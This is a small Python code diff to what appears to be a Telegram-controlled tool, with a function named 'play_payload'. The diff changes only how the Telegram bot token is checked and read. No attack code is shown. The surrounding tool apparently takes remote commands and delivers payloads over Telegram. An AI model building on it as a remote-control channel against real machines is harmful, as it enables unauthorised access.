@@ -208,10 +208,13 @@ def play_payload(cn):
 def connect_to_Telegram():
 	while True:
 		try:
-			if settins['API_Token'] == None:
+			if settins['API_Token'] is None:
 				z = input("Enter the telegram API token : ")
 			else:
-				z = settins['API_Token']
+				try:
+					z = settins['API_Token']
+				except:
+					z = input("Enter the telegram API token : ")
 			bot = Bot(token=z)
 			print("connected with telegram")
 			print("send commands to get started")
